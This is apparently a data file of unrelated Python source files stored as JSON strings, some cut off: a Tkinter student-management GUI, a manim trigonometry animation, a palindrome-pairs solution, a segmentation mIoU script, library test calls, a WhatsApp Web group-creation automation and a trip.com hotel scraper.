self.photoimg2=ImageTk.PhotoImage(img2)\r\n        \r\n        f_lbl=Label(self.root,image=self.photoimg2)\r\n        f_lbl.place(x=1000,y=0,width=550,height=130)\r\n        \r\n        #big image\r\n        img3=Image.open(r\"college_images\\a6.jpg\")\r\n        img3=img3.resize((1300,710),Image.ANTIALIAS)\r\n        self.photoimg3=ImageTk.PhotoImage(img3)\r\n        \r\n        bg_img=Label(self.root,image=self.photoimg3)\r\n        bg_img.place(x=0,y=130,width=1300,height=710)\r\n        \r\n        title_lbl=Label(bg_img,text=\"STUDENT MANAGEMENT SYSTEM\",font=(\"times new roman\",35,\"bold\"),bg=\"red\",fg=\"blue\")\r\n        title_lbl.place(x=0,y=0,width=1300,height=45)\r\n        \r\n        main_frame=Frame(bg_img,bd=2,bg=\"white\")\r\n        main_frame.place(x=10,y=55,width=1250,height=600)\r\n        \r\n        # left lable frame\r\n        Left_frame=LabelFrame(main_frame,bd=2,bg=\"white\",relief=RIDGE,text=\"Student Details\",font=(\"times new roman\",12,\"bold\"))\r\n        Left_frame.place(x=10,y=10,width=610,height=440)\r\n        \r\n        img_left=Image.open(r\"college_images\\a2.jpg\")\r\n        img_left=img_left.resize((610,130),Image.ANTIALIAS)\r\n        self.photoimg_left=ImageTk.PhotoImage(img_left)\r\n        \r\n        f_lbl=Label(Left_frame,image=self.photoimg_left)\r\n        f_lbl.place(x=0,y=0,width=608,height=130)\r\n        \r\n        \r\n        #current course\r\n        current_course_frame=LabelFrame(Left_frame,bd=2,bg=\"white\",relief=RIDGE,text=\"Current course information\",font=(\"times new roman\",12,\"bold\"))\r\n        current_course_frame.place(x=0,y=10,width=608,height=140)\r\n        \r\n        #Department\r\n        dep_label=Label(current_course_frame,text=\"Department\",font=(\"times new roman\",12,\"bold\"),bg=\"white\")\r\n        dep_label.grid(row=0,column=0,padx=10)\r\n        \r\n        dep_combo=ttk.Combobox(current_course_frame,textvariable=self.var_dep,font=(\"times new roman\",12,\"bold\"),state=\"readonly\")\r\n        dep_combo[\"values\"]=(\"Select Department\",\"CSE\",\"ECE\",\"IT\",\"ME\",\"MBA\",\"BCA\",\"BBA\")\r\n        dep_combo.current(0)\r\n        dep_combo.grid(row=0,column=1,padx=2,pady=10)\r\n        \r\n        # Course\r\n        Course_label=Label(current_course_frame,text=\"Course\",font=(\"times new roman\",13,\"bold\"),bg=\"white\")\r\n        Course_label.grid(row=0,column=2,padx=10,sticky=W)\r\n        \r\n        Course_combo=ttk.Combobox(current_course_frame,textvariable=self.var_course,font=(\"times new roman\",13,\"bold\"),state=\"readonly\")\r\n        Course_combo[\"values\"]=(\"Select Course \",\"B.Tech\",\"MBA\",\"BA\",\"B.Sc\")\r\n        Course_combo.current(0)\r\n        Course_combo.grid(row=0,column=3,padx=2,pady=10,sticky=W)\r\n        \r\n        # Year\r\n        Year_label=Label(current_course_frame,text=\"Year\",font=(\"times new roman\",13,\"bold\"),bg=\"white\")\r\n        Year_label.grid(row=1,column=0,padx=10,sticky=W)\r\n        \r\n        Year_combo=ttk.Combobox(current_course_frame,textvariable=self.var_year,font=(\"times new roman\",13,\"bold\"),state=\"readonly\")\r\n        Year_combo[\"values\"]=(\"Select Year \",\"2021-22\",\"2022-23\",\"2023-24\",\"2024-25\")\r\n        Year_combo.current(0)\r\n        Year_combo.grid(row=1,column=1,padx=2,pady=10,sticky=W)\r\n        \r\n        # Semester\r\n        Semester_label=Label(current_course_frame,text=\"Semester\",font=(\"times new roman\",13,\"bold\"),bg=\"white\")\r\n        Semester_label.grid(row=1,column=2,padx=10,sticky=W)\r\n        \r\n        Semester_combo=ttk.Combobox(curren",
    "from manimlib import *\nfrom collections import namedtuple\n\nclass Coordinate(namedtuple('Coordinate', ('x', 'y', 'z'))):\n\t__slots__ = ()  # no idea what this does\n\nclass UnitTrianglePoints(namedtuple('UnitTrianglePoints', ('bl', 'br', 'tr'))):\n\t__slots__ = ()  # no idea what this does\n\nclass UnitTriangleEdges(namedtuple('UnitTriangleEdges', ('b', 'r', 'tl'))):\n\t__slots__ = ()  # no idea what this does\n\nclass TrigTriangle(Scene):\n\tdef construct(self):\n\t\t# triangle value trackers\n\t\tangle = ValueTracker(PI/6)\n\t\thypotenuse = ValueTracker(3.7)\n\t\tx = ValueTracker(0)\n\t\ty = ValueTracker(0)\n\n\t\tdef normalize_angle(angle: float):\n\t\t\treturn (angle + TAU * math.ceil(angle / TAU)) % TAU\n\n\t\t# returns normalize angle value tracker\n\t\tdef get_normalized_angle():\n\t\t\treturn normalize_angle(angle.get_value())\n\t\t\n\n\t\tdef get_points():\n\t\t\tbl = x.get_value(), y.get_value(), 0\n\t\t\tbr = x.get_value() + math.cos(angle.get_value()) * hypotenuse.get_value(), y.get_value(), 0\n\t\t\ttr = (\n\t\t\t\tx.get_value() + math.cos(angle.get_value()) * hypotenuse.get_value(),\n\t\t\t\ty.get_value() + math.sin(angle.get_value()) * hypotenuse.get_value(),\n\t\t\t\t0,\n\t\t\t)\n\t\t\treturn UnitTrianglePoints(Coordinate(*bl), Coordinate(*br), Coordinate(*tr))\n\t\t\n\t\tdef get_dots():\n\t\t\treturn UnitTrianglePoints(*(Dot(i) for i in get_points()))\n\t\t\n\t\tdef get_lines():\n\t\t\tpoints = get_points()\n\t\t\tb = Line(points[0], points[1])\n\t\t\tr = Line(points[1], points[2])\n\t\t\ttl = Line(points[0], points[2])\n\t\t\treturn UnitTriangleEdges(b, r, tl)\n\n\t\talways_redraw_lines = [\n\t\t\talways_redraw(lambda: get_lines().b.set_color(BLUE)),\n\t\t\talways_redraw(lambda: get_lines().r.set_color(RED)),\n\t\t\talways_redraw(lambda: get_lines().tl).set_color(GREY),\n\t\t]\n\n\t\tdef align_mobject_center(mobject: Mobject, point: Iterable[float], rotation: float, normal_angle: float, distance: float):\n\t\t\tpos = (\n\t\t\t\tpoint[0] + math.cos(normal_angle) * distance,\n\t\t\t\tpoint[1] + math.sin(normal_angle) * distance,\n\t\t\t\t0,\n\t\t\t)\n\t\t\treturn mobject.rotate(rotation).move_to(pos)\n\t\t\n\t\tdef align_mobject_corner(mobject: Mobject, point: Iterable[float], rotation: float, normal_angle: float, distance: float):\n\t\t\tpos = (\n\t\t\t\tpoint[0] + math.cos(normal_angle) * distance,\n\t\t\t\tpoint[1] + math.sin(normal_angle) * distance,\n\t\t\t\t0,\n\t\t\t)\n\t\t\tbounding_box_width, bounding_box_height = mobject.get_width(), mobject.get_height()\n\t\t\tnormal_angle = normalize_angle(normal_angle)\n\t\t\tif normal_angle < PI/2:\n\t\t\t\tnormal_angle = PI/4\n\t\t\t\tshift = bounding_box_width / 2, bounding_box_height / 2, 0\n\t\t\telif normal_angle < PI:\n\t\t\t\tnormal_angle = 3*PI/4\n\t\t\t\tshift = -bounding_box_width / 2, bounding_box_height / 2, 0\n\t\t\telif normal_angle < 3*PI/2:\n\t\t\t\tnormal_angle = 5*PI/4\n\t\t\t\tshift = -bounding_box_width / 2, -bounding_box_height / 2, 0\n\t\t\telse:\n\t\t\t\tnormal_angle = 7*PI/4\n\t\t\t\tshift = bounding_box_width / 2, -bounding_box_height / 2, 0\n\t\t\treturn mobject.rotate(rotation).move_to(pos).shift(shift)\n\t\t\n\t\tdef align_mobject_corner_interpolate(mobject: Mobject, point: Iterable[float], rotation: float, normal_angle: float, distance: float):\n\t\t\tpos = (\n\t\t\t\tpoint[0] + math.cos(normal_angle) * distance,\n\t\t\t\tpoint[1] + math.sin(normal_angle) * distance,\n\t\t\t\t0,\n\t\t\t)\n\t\t\tbounding_box_width, bounding_box_height = mobject.get_width(), mobject.get_height()\n\t\t\tnormal_angle = normalize_angle(normal_angle)\n\n\t\t\tdef get_shift_val(min_angle: float, max_angle: float, angle: float, max_shift: float):\n\t\t\t\treturn ((angle - min_angle) / (max_angle - min_angle) * 2 - 1) * max_shift\n\n\t\t\tif normal_angle < PI/4 or normal_angle > 7*PI/4:\n\t\t\t\tshift = bounding_box_width / 2, get_shift_val(0, PI/2, normalize_angle(normal_angle+PI/4), bounding_box_height / 2), 0\n\t\t\telif normal_angle < 3*PI/4:\n\t\t\t\tshift = get_shift_val(PI/4, 3*PI/4, normal_angle, -bounding_box_width / 2), bounding_box_height / 2, 0\n\t\t\telif normal_angle < 5*PI/4:\n\t\t\t\tshift = -bounding_box_width / 2, get_shift_val(3*PI/4, 5*PI/4, normal_angle, -bounding_box_height / 2), 0\n\t\t\telse:\n\t\t\t\tshift = get_shift_val(5*PI/4, 7*PI/4, normal_angle, bounding_box_width / 2), -bounding_box_height / 2, 0\n\t\t\treturn mobject.rotate(rotation).move_to(pos).shift(shift)\n\t\t\n\t\t# edge labels\n\t\tedge_label_distance = ValueTracker(0.2)\n\t\tedge_label_size = ValueTracker(6)\n\t\talways_redraw_labels = [\n\t\t\talways_redraw(lambda: align_mobject_center(Text(f'{round(abs(get_points().br.x - get_points().bl.x) / hypotenuse.get_value(), 2)}', font_size=round(edge_label_size.get_value()*hypotenuse.get_value())), get_lines().b.get_center(), 0, 3*PI/2 if math.sin(angle.get_value()) > 0 else PI/2, edge_label_distance.get_value()).set_color(BLUE)),\n\t\t\talways_redraw(lambda: align_mobject_center(Text(f'{round(abs(get_points().br.y - get_points().tr.y) / hypotenuse.get_value(), 2)}', font_size=round(edge_label_size.get_value()*hypotenuse.get_value())), get_lines().r.get_center(), 3*PI/2 if math.cos(angle.get_value()) > 0 else PI/2, 0 if math.cos(angle.get_value()) > 0 else PI, edge_label_distance.get_value()).set_color(RED)),\n\t\t\t# always_redraw(lambda: redraw_label_function(lambda: f'{round(math.dist",
    "class Solution:\n    def palindromePairs(self, words: list[str]) -> list[list[int]]:\n        # reverse_dict = {word[::-1]:word_i for word_i, word in enumerate(words)}\n        reverse_idx = {}\n        reverse_words = {}\n        for word_i, word in enumerate(words):\n            reversed_word = word[::-1]\n            reverse_idx[reversed_word] = word_i\n            reverse_words[word_i] = reversed_word\n\n        def get_reversed_substring(word_i, i, j):\n            i = -len(reverse_words[word_i]) if i==0 and j!=0 else i\n            return reverse_words[word_i][-j:-i]\n\n        ret = []\n\n        def check_substrings(substring, substring_idx, if_start=True):\n            if substring in reverse_idx and reverse_idx[substring] != substring_idx:\n                if not if_start:\n                    ret.append([substring_idx, reverse_idx[substring]])\n                else:\n                    ret.append([reverse_idx[substring], substring_idx])\n\n        for word_j, word in enumerate(words):\n\n            # midpoint at the start of word_j\n            midpoint = 0\n            left_half = \"\" # reversed\n            try:\n                while True:\n                    left_half = get_reversed_substring(word_j, 0, midpoint)\n                    right_half = word[midpoint:midpoint*2]\n                    if left_half == right_half:\n                        check_substrings(word[midpoint*2:], word_j)\n                    \n                    right_half = word[midpoint+1:midpoint*2+1]\n                    if left_half == right_half:\n                        check_substrings(word[midpoint*2+1:], word_j)\n                    \n                    midpoint += 1\n                    assert midpoint <= len(word)//2\n            except:\n                pass\n            # midpoint at the end of word_j\n            step_count = 0\n            try:\n                while True:\n                    \n                    left_half = word[-step_count*2:-step_count]\n                    right_half = get_reversed_substring(word_j, len(word)-step_count, len(word))\n                    if step_count != 0 and left_half == right_half:\n                        check_substrings(word[:len(word)-step_count*2], word_j, if_start=False)\n                    left_half = word[-step_count*2-1:-step_count-1]\n                    if left_half == right_half:\n                        check_substrings(word[:-step_count*2-1], word_j, if_start=False)\n                    step_count += 1\n                    assert step_count <= len(word)//2\n            except:\n                pass\n        return ret\n\nif __name__ == \"__main__\":\n    testcase1 = [\"abcd\",\"dcba\",\"lls\",\"s\",\"sssll\"]\n    sol = Solution()\n    print(sol.palindromePairs(testcase1))\n",
    "from os.path import join\r\n\r\nimport numpy as np\r\nfrom PIL import Image\r\n\r\n\r\n# \u8bbe\u6807\u7b7e\u5bbdW\uff0c\u957fH\r\ndef fast_hist(a, b, n):\r\n    #--------------------------------------------------------------------------------#\r\n    #   a\u662f\u8f6c\u5316\u6210\u4e00\u7ef4\u6570\u7ec4\u7684\u6807\u7b7e\uff0c\u5f62\u72b6(H\u00d7W,)\uff1bb\u662f\u8f6c\u5316\u6210\u4e00\u7ef4\u6570\u7ec4\u7684\u9884\u6d4b\u7ed3\u679c\uff0c\u5f62\u72b6(H\u00d7W,)\r\n    #--------------------------------------------------------------------------------#\r\n    k = (a >= 0) & (a < n)\r\n    #--------------------------------------------------------------------------------#\r\n    #   np.bincount\u8ba1\u7b97\u4e86\u4ece0\u5230n**2-1\u8fd9n**2\u4e2a\u6570\u4e2d\u6bcf\u4e2a\u6570\u51fa\u73b0\u7684\u6b21\u6570\uff0c\u8fd4\u56de\u503c\u5f62\u72b6(n, n)\r\n    #   \u8fd4\u56de\u4e2d\uff0c\u5199\u5bf9\u89d2\u7ebf\u4e0a\u7684\u4e3a\u5206\u7c7b\u6b63\u786e\u7684\u50cf\u7d20\u70b9\r\n    #--------------------------------------------------------------------------------#\r\n    return np.bincount(n * a[k].astype(int) + b[k], minlength=n ** 2).reshape(n, n)  \r\n\r\ndef per_class_iu(hist):\r\n    return np.diag(hist) / np.maximum((hist.sum(1) + hist.sum(0) - np.diag(hist)), 1) \r\n\r\ndef per_class_PA(hist):\r\n    return np.diag(hist) / np.maximum(hist.sum(1), 1) \r\n\r\ndef compute_mIoU(gt_dir, pred_dir, png_name_list, num_classes, name_classes):  \r\n    print('Num classes', num_classes)  \r\n\r\n    #-----------------------------------------#\r\n    #   \u521b\u5efa\u4e00\u4e2a\u5168\u662f0\u7684\u77e9\u9635\uff0c\u662f\u4e00\u4e2a\u6df7\u6dc6\u77e9\u9635\r\n    #-----------------------------------------#\r\n    hist = np.zeros((num_classes, num_classes))\r\n    \r\n    #------------------------------------------------#\r\n    #   \u83b7\u5f97\u9a8c\u8bc1\u96c6\u6807\u7b7e\u8def\u5f84\u5217\u8868\uff0c\u65b9\u4fbf\u76f4\u63a5\u8bfb\u53d6\r\n    #   \u83b7\u5f97\u9a8c\u8bc1\u96c6\u56fe\u50cf\u5206\u5272\u7ed3\u679c\u8def\u5f84\u5217\u8868\uff0c\u65b9\u4fbf\u76f4\u63a5\u8bfb\u53d6\r\n    #------------------------------------------------#\r\n    gt_imgs = [join(gt_dir, x + \"_mask\" + \".png\") for x in png_name_list]\r\n    pred_imgs = [join(pred_dir, x + \".png\") for x in png_name_list]  \r\n    print(gt_imgs)\r\n    print(pred_imgs)\r\n    #------------------------------------------------#\r\n    #   \u8bfb\u53d6\u6bcf\u4e00\u4e2a\uff08\u56fe\u7247-\u6807\u7b7e\uff09\u5bf9\r\n    #------------------------------------------------#\r\n    for ind in range(len(gt_imgs)): \r\n        #------------------------------------------------#\r\n        #   \u8bfb\u53d6\u4e00\u5f20\u56fe\u50cf\u5206\u5272\u7ed3\u679c\uff0c\u8f6c\u5316\u6210numpy\u6570\u7ec4\r\n        #------------------------------------------------#\r\n        pred = np.array(Image.open(pred_imgs[ind]))\r\n        print(pred)\r\n        #------------------------------------------------#\r\n        #   \u8bfb\u53d6\u4e00\u5f20\u5bf9\u5e94\u7684\u6807\u7b7e\uff0c\u8f6c\u5316\u6210numpy\u6570\u7ec4\r\n        #------------------------------------------------#\r\n        label = np.array(Image.open(gt_imgs[ind]))\r\n        label = np.where(label == 0, 1, 0)\r\n        print(label)\r\n        print('--------------------------------------')\r\n\r\n        # \u5982\u679c\u56fe\u50cf\u5206\u5272\u7ed3\u679c\u4e0e\u6807\u7b7e\u7684\u5927\u5c0f\u4e0d\u4e00\u6837\uff0c\u8fd9\u5f20\u56fe\u7247\u5c31\u4e0d\u8ba1\u7b97\r\n        if len(label.flatten()) != len(pred.flatten()):  \r\n            print(\r\n                'Skipping: len(gt) = {:d}, len(pred) = {:d}, {:s}, {:s}'.format(\r\n                    len(label.flatten()), len(pred.flatten()), gt_imgs[ind],\r\n                    pred_imgs[ind]))\r\n            continue\r\n\r\n        #------------------------------------------------#\r\n        #   \u5bf9\u4e00\u5f20\u56fe\u7247\u8ba1\u7b9721\u00d721\u7684hist\u77e9\u9635\uff0c\u5e76\u7d2f\u52a0\r\n        #------------------------------------------------#\r\n        hist += fast_hist(label.flatten(), pred.flatten(),num_classes)\r\n        print(hist)\r\n        # \u6bcf\u8ba1\u7b9710\u5f20\u5c31\u8f93\u51fa\u4e00\u4e0b\u76ee\u524d\u5df2\u8ba1\u7b97\u7684\u56fe\u7247\u4e2d\u6240\u6709\u7c7b\u522b\u5e73\u5747\u7684mIoU\u503c\r\n        if ind > 0 and ind % 10 == 0:  \r\n            print('{:d} / {:d}: mIou-{:0.2f}; mPA-{:0.2f}'.format(ind, len(gt_imgs),\r\n                                                    100 * np.nanmean(per_class_iu(hist)),\r\n                                                    100 * np.nanmean(per_class_PA(hist))))\r\n    #------------------------------------------------#\r\n    #   \u8ba1\u7b97\u6240\u6709\u9a8c\u8bc1\u96c6\u56fe\u7247\u7684\u9010\u7c7b\u522bmIoU\u503c\r\n    #------------------------------------------------#\r\n    mIoUs   = per_class_iu(hist)\r\n    mPA     = per_class_PA(hist)\r\n    #------------------------------------------------#\r\n    #   \u9010\u7c7b\u522b\u8f93\u51fa\u4e00\u4e0bmIoU\u503c\r\n    #------------------------------------------------#\r\n    for ind_class in range(num_classes):\r\n        print('===>' + name_classes[ind_class] + ':\\tmIou-' + str(round(mIoUs[ind_class] * 100, 2)) + '; mPA-' + str(round(mPA[ind_class] * 100, 2)))\r\n\r\n    #-----------------------------------------------------------------#\r\n    #   \u5728\u6240\u6709\u9a8c\u8bc1\u96c6\u56fe\u50cf\u4e0a\u6c42\u6240\u6709\u7c7b\u522b\u5e73\u5747\u7684mIoU\u503c\uff0c\u8ba1\u7b97\u65f6\u5ffd\u7565NaN\u503c\r\n    #-----------------------------------------------------------------#\r\n    print('===> mIoU: ' + str(round(np.nanmean(mIoUs) * 100, 4)) + '; mPA: ' + str(round(np.nanmean(mPA) * 100, 4)))\r\n    return mIoUs\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    gt_dir = \"./ganzang_Datasets/Labels\"\r\n    pred_dir = \"miou_pr_dir1\"\r\n    png_name_list = open(\"./ganzang_Datasets/ImageSets/Segmentation/val.txt\",'r').read().splitlines()\r\n    #------------------------------#\r\n    #   \u5206\u7c7b\u4e2a\u6570+1\r\n    #   2+1\r\n    #------------------------------#\r\n    num_classes = 2\r\n    #--------------------------------------------#\r\n    #   \u533a\u5206\u7684\u79cd\u7c7b\uff0c\u548cjson_to_dataset\u91cc\u9762\u7684\u4e00\u6837\r\n    #--------------------------------------------#\r\n    #name_classes = [\"background\",\"aeroplane\", \"bicycle\", \"bird\", \"boat\", \"bottle\", \"bus\", \"car\", \"cat\", \"chair\", \"cow\", \"diningtable\", \"dog\", \"horse\", \"motorbike\", \"person\", \"pottedplant\", \"sheep\", \"sofa\", \"train\", \"tvmonitor\"]\r\n    name_classes = [\"background\",\"ganzang\"]\r\n    compute_mIoU(gt_dir, pred_dir, png_name_list, num_classes, name_classes)  # \u6267\u884c\u8ba1\u7b97mIoU\u7684\u51fd\u6570\r\n",
    "import wolframium\n\n# print(\"Hello from Wolframium library!\")\n\n#### |            | ####\n#### | TEST UNITS | ####\n#### v            v ####\n\n# =============================================================================================================================\n# ARITHMETICS =================================================================================================================\n# =============================================================================================================================\n\n# addition #\n\n# print(wolframium.lmfn_add_2_args(1.1, 1.1))                                        # Done\n# print(wolframium.lmfn_add_3_args(1.1, 1.1, 1.1))                                   # Done\n# print(wolframium.lmfn_add_4_args(1.1, 1.1, 1.1, 1.1))                              # Done\n# print(wolframium.lmfn_add_5_args(1.1, 1.1, 1.1, 1.1, 1.1))                         # Done\n# print(wolframium.lmfn_add_6_args(1.1, 1.1, 1.1, 1.1, 1.1, 1.1))                    # Done\n# print(wolframium.lmfn_add_7_args(1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1))               # Done\n# print(wolframium.lmfn_add_8_args(1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1))          # Done\n\n# print(wolframium.add_2_int_args__int(4, 8.8))                                      # Done\n# print(wolframium.add_3_int_args__int(4.4, 8.8, 7.7))                               # Done\n# print(wolframium.add_4_int_args__int(4.4, 8.8, 7.7, 4.4))                          # Done\n# print(wolframium.add_5_int_args__int(1.1, 2.2, 1.1, 2.2, 1.1))                     # Done\n# print(wolframium.add_6_int_args__int(1.1, 2.2, 1.1, 2.2, 1.1, 2.2))                # Done\n# print(wolframium.add_7_int_args__int(1.1, 2.2, 1.1, 2.2, 1.1, 2.2, 3.3))           # Done\n# print(wolframium.add_8_int_args__int(1.1, 2.2, 1.1, 2.2, 1.1, 2.2, 3.3, 4.4))      # Done\n\n# subtraction #\n\n# print(wolframium.lmfn_subt_2_args(1, 0.1))                                         # Done\n# print(wolframium.lmfn_subt_3_args(1.1, 1.1, 1.1))                                  # Done\n# print(wolframium.lmfn_subt_4_args(-1.1, 1.1, -1.1, 1.1))                           # Done\n# print(wolframium.lmfn_subt_5_args(-1.1, 1.1, -1.1, 1.1, -1.1))                     # Done\n# print(wolframium.lmfn_subt_6_args(0.6, 0.1, 0.1, 0.1, 0.1, 0.1))                   # Done\n# print(wolframium.lmfn_subt_7_args(7.7, -6.6, 5.5, -4.4, 3.3, -2.2, 1.1))           # Done\n# print(wolframium.lmfn_subt_8_args(100, 90, 80, 70, 60, 50, 40, 30))                # Done\n\n# print(wolframium.subt_2_int_args__int(4, 8.8))\n# print(wolframium.subt_3_int_args__int(4.4, 8.8, -7))\n# print(wolframium.subt_4_int_args__int(-4.4, 0.8, -1.7, 1))\n# print(wolframium.subt_5_int_args__int(0.0, 0.1, 0.2, 0.3, 0.4))\n# print(wolframium.subt_6_int_args__int(-0.1, -0.2, -0.3, -0.4, -0.5, -0.6))\n# print(wolframium.subt_7_int_args__int(7.7, -6.6, 5.5, -4.4, 3.3, -2.2, 1.1))\n# print(wolframium.subt_8_int_args__int(100, 90, 80, 70, 60, 50, 40, 30))\n\n\n\n# print(wolframium.lmfn_div_3_args(32, 10, 2))\n# print(wolframium.div_3_int_args__int(32, 10, 2))\n\n\n\n# print(wolframium.get_n_first_natural_even_numbers_in_a_row(4, True))               # Done\n# print(wolframium.get_n_first_natural_odd_numbers_in_a_row(4))                      # Done\n\n# print(wolframium.get_sum_of_the_first_n_members_of_arithmetical_progression(4, 4)) # Done\n# print(wolframium.get_row_of_the_first_n_members_of_arithmetical_progression(4, 4)) # Done\n",
    "import csv\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom time import time, sleep\nfrom openpyxl import Workbook\nimport PySimpleGUI as sg\nimport re\nimport sys\nimport csv\nimport os\n\ndef dividir_string_em_quatro_partes(texto):\n    # Calcular o tamanho de cada parte\n    tamanho_total = len(texto)\n    tamanho_parte = tamanho_total // 4\n\n    # Calcular os \u00edndices de divis\u00e3o\n    inicio_1, inicio_2, inicio_3 = 0, tamanho_parte, 2 * tamanho_parte\n    fim_1, fim_2, fim_3 = tamanho_parte, 2 * tamanho_parte, 3 * tamanho_parte\n\n    # Dividir a string em quatro partes\n    parte_1 = texto[inicio_1:fim_1]\n    parte_2 = texto[inicio_2:fim_2]\n    parte_3 = texto[inicio_3:fim_3]\n    parte_4 = texto[fim_3:]\n\n    return parte_1, parte_2, parte_3, parte_4\n\ndef atualizar_barra_carregamento(indice, total_numeros, horas_restantes, minutos_restantes, segundos_restantes, progress_bar, porcentagem_text):\n    \n    taxa_progresso = indice / total_numeros\n\n    progress_bar.update_bar(indice, total_numeros)\n\n    porcentagem_text.update(f'{int(taxa_progresso * 100)}% | Faltam {int(total_numeros - indice)} contatos | Tempo Restante Estimado: {int(horas_restantes)}h {int(minutos_restantes)}m {int(segundos_restantes)}s')\n\ndef criar_grupo(progress_bar, porcentagem_text):\n\n    navegador = webdriver.Chrome()\n    navegador.get(\"https://web.whatsapp.com/\")\n\n    while len(navegador.find_elements(By.XPATH, '//*[@id=\"app\"]/div/div[2]/div[3]/div[1]/div/div/div[2]/div/canvas')) < 1:\n        pass\n\n    while len(navegador.find_elements(By.ID, 'side')) < 1:\n        pass\n\n    # Obter n\u00fameros do arquivo CSV\n    numeros_do_csv = ler_numeros_csv()\n    sleep(5)\n    try:\n\n        # Criando grupo\n        criar_grupo = navegador.find_element(By.XPATH, '//*[@id=\"app\"]/div/div[2]/div[3]/header/div[2]/div/span/div[5]/div')\n        sleep(1)\n        criar_grupo.click()\n\n        # Novo grupo\n        novo_grupo = navegador.find_element(By.XPATH, '//*[@id=\"app\"]/div/div[2]/div[3]/header/div[2]/div/span/div[5]/span/div/ul/li[1]/div')\n        sleep(1)\n        novo_grupo.click()\n        sleep(5)\n\n        total_numeros = len(numeros_do_csv)\n        tempo_inicial = time()\n\n        # Acessando o campo de pesquisa\n        sleep(5)\n        campo_pesquisa1 = navegador.find_element(By.XPATH, '//*[@id=\"app\"]/div/div[2]/div[2]/div[1]/span/div/span/div/div/div[1]/div/div/div[2]/input')\n        sleep(10)\n        for indice, numero in enumerate(numeros_do_csv, start=1):\n\n            # Calcular o tempo decorrido\n            tempo_decorrido = time() - tempo_inicial\n\n            # Calcular a taxa de progresso\n            taxa_progresso = indice / total_numeros\n\n            # Calcular o tempo restante estimado\n            tempo_restante_estimado = (tempo_decorrido / taxa_progresso) - tempo_decorrido\n\n            # Formatar e imprimir o tempo restante estimado\n            minutos_restantes, segundos_restantes = divmod(int(tempo_restante_estimado), 60)\n            horas_restantes, minutos_restantes = divmod(minutos_restantes, 60)\n            atualizar_barra_carregamento(indice, total_numeros, horas_restantes, minutos_restantes, segundos_restantes, progress_bar, porcentagem_text)\n\n            parte1, parte2, parte3, parte4 = dividir_string_em_quatro_partes(str(numero))\n\n            # Escrevendo o numero do telefone\n            campo_pesquisa1.send_keys(parte1)\n            sleep(0.05)\n            campo_pesquisa1.send_keys(parte2)\n            sleep(0.04)\n            campo_pesquisa1.send_keys(parte3)\n            sleep(0.05)\n            campo_pesquisa1.send_keys(parte4)\n\n            for i in range(12):\n                try:\n                    adicionar_numero = campo_pesquisa1.find_element(By.XPATH, '//*[@id=\"app\"]/div/div[2]/div[2]/div[1]/span/div/span/div/div/div[2]/div[2]/div[2]')\n                    adicionar_numero.click()\n                    break\n                except Exception:\n                    sleep(0.3)\n                    pass\n\n            campo_pesquisa1.clear()\n                \n\n\n        avancar_grupo = navegador.find_element(By.XPATH, '//*[@id=\"app\"]/div/div[2]/div[2]/div[1]/span/div/span/div/div/span/div')\n        avancar_grupo.click()\n        sleep(2.5)\n\n\n        # Finaliza cria\u00e7\u00e3o do grupo\n        input(\"\\nPressione ENTER para Continuar\")\n        finish_grpup = navegador.find_element(By.XPATH, '//*[@id=\"app\"]/div/div[2]/div[2]/div[1]/span/div/span/div/div/span/div/div')\n        finish_grpup.click()    \n\n    except Exception as er:\n        sg.popup_error(f\"Error: {er}\")           \n\ndef capturar_dados(grupo_nome, nome_contato):\n\n    navegador = webdriver.Chrome()\n    navegador.get(\"https://web.whatsapp.com/\")\n\n    while len(navegador.find_elements(By.XPATH, '//*[@id=\"app\"]/div/div[2]/div[3]/div[1]/div/div/div[2]/div/canvas')) < 1:\n        pass\n\n    while len(navegador.find_elements(By.ID, 'side')) < 1:\n        pass\n\n    # Encontrar o elemento de pesquisa\n    pesquisa_element = navegador.find_element(By.XPATH, '//*[@id=\"side\"]/div[1]/div/div[2]/b",
    "#! pip install pandas undetected_chromedriver bs4 selenium\nfrom selenium.webdriver.support.ui import WebDriverWait\nimport undetected_chromedriver as uc\nfrom bs4 import BeautifulSoup\nimport re\nimport pandas as pd\nimport time\n\nwait_time = 1000\ntimeout = 3000\ntotal_iterations = 20\n# actual url to be scaped\nurl = \"https://www.trip.com/hotels/list?city=220&cityName=Dubai&provinceId=0&countryId=0&districtId=0&checkin=2024%2F04%2F03&checkout=2024%2F04%2F11&crn=1&adult=2&children=0&searchBoxArg=t&travelPurpose=0&ctm_ref=ix_sb_dl&domestic=true&listFilters=17%7C1*17*1*2%2C80%7C0%7C1*80*0*2%2C29%7C1*29*1%7C2*2&locale=en-XX&curr=USD\"\n\nhotel_details = {}\ncity_id = re.split(\"=|&\", url)[1]\ndef scrape_quotes(url):\n    driver = uc.Chrome()\n    driver.get(url)\n    WebDriverWait(driver, timeout, wait_time)\n    initial_html = driver.page_source\n    initial_soup = BeautifulSoup(initial_html, \"html.parser\")\n    initial_quotes = initial_soup.find_all(\"div\", class_=\"compressmeta-hotel-wrap-v8\")\n    extract_and_print_quotes(initial_quotes)\n    for _ in range(total_iterations):\n        driver.execute_script(\n            \"window.scrollTo(0, document.body.scrollHeight);\")\n        driver.implicitly_wait(10)\n        time.sleep(10)\n        WebDriverWait(driver, timeout, wait_time)\n        scroll_html = driver.page_source\n        scroll_soup = BeautifulSoup(scroll_html, \"html.parser\")\n        scroll_quotes = scroll_soup.find_all(\"div\", class_=\"compressmeta-hotel-wrap-v8\")\n        extract_and_print_quotes(scroll_quotes)\n    driver.quit()\n\n\ndef extract_and_print_quotes(quotes):\n    for quote in quotes:\n        quote = BeautifulSoup(str(quote), \"html.parser\")\n        hotel_id = quote.find(\"div\", class_=\"compressmeta-hotel-wrap-v8\")[\"id\"]\n        hotel_name = quote.find(\"span\", class_=\"name\").text\n        hotel_details[hotel_name] = (\n            f\"https://www.trip.com/hotels/detail/?cityId={city_id}&hotelId={hotel_id}\"\n        )\n        print(f\"Hotel ID: {hotel_id}\")\n        print(f\"Hotel Name: {hotel_name}\")\n        print(f\"{len(hotel_details)=}\")\n        print(\"----------\")\n\n\nif __name__ == \"__main__\":\n    scrape_quotes(url)\n    print(hotel_details)\n    import pandas as pd\n    pd.DataFrame.from_dict(hotel_details, orient=\"index\").to_csv(\"123.csv\")\n",
